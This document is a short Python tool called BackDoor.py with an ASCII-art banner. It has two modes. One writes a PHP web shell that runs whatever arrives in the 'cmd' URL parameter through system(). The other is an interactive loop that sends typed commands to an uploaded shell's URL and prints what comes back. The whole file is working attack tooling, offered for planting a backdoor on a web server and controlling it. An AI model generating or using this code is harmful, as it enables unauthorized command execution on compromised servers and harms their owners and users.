from bs4 import BeautifulSoup
import urllib.request
from optparse import OptionParser

banner= """

              _      ______            _       _                  
             | |     | ___ \          | |     | |                 
__      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
\ \ /\ / / _ \ '_ \  | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 \ V  V /  __/ |_) | | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
  \_/\_/ \___|_.__/  \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                                  

[ @intx0x80 ]


"""



parse=OptionParser("""



              _      ______            _       _                  
             | |     | ___ \          | |     | |                 
__      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
\ \ /\ / / _ \ '_ \  | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 \ V  V /  __/ |_) | | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
  \_/\_/ \___|_.__/  \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                                  
                                                                  
./BackDoor.py [options]
[options]

-u    ,   --url   :         url for uploaded shell
-g    , --generate          generate webshell


 usge                                          
./BackDoor.py -u http://127.0.0.1
./BackDoor.py -g shell
./BackDoor.py --url http://127.0.0.1
./BackDoor.py --generate shell

[ @intx0x80 ]

""")

parse.add_option("-u","--url",dest="url",type="string",help="shell url ")          
parse.add_option("-g","--generate",dest="gene",type="string",help="shell name")
(opt,args)=parse.parse_args()
if opt.url==None and opt.gene==None:
    print(parse.usage)
    exit(0)
else:
    if opt.gene!=None and opt.url==None :
        print(banner)
        shell_n=str(opt.gene)
        shell=shell_n+".php"
        opfile=open(shell,"+w")
        evil_code="""
<?php
echo system($_GET['cmd']);
??
"""

        opfile.write(evil_code)
        opfile.close()
        print("[ "+shell +"]"+"    is Generated ...")
    if opt.url!=None and opt.gene==None:
        url=str(opt.url)
        print(banner)
        while True:
            #buff=""
            cmd=str(input("$ "))
            openurl=urllib.request.urlopen(url+"?cmd={0}".format(cmd))
            reponse=str(openurl.read())
            soup=BeautifulSoup(reponse,"html.parser")
            #for i in soup
            print(soup.prettify())
            #print(soup.get_text())
